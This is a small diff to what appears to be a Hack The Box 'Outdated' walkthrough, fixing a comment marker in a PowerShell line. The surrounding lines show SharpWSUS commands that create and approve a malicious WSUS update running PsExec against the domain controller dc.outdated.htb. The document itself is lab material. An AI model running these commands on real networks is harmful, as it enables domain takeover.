@@ -257,7 +257,7 @@ Invoke-SharpWSUS create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:
 The output should display an update ID that we can use with the `approve` option to approve the update for `dc.outdated.htb`.
 
 ```powershell
-$UpdateId = "" Add update id here
+$UpdateId = "" # Add update id here
 Invoke-SharpWSUS approve /updateid:"$UpdateId" /computername:"dc.outdated.htb" /groupname:"3v1LGr0Up"
 ```
 
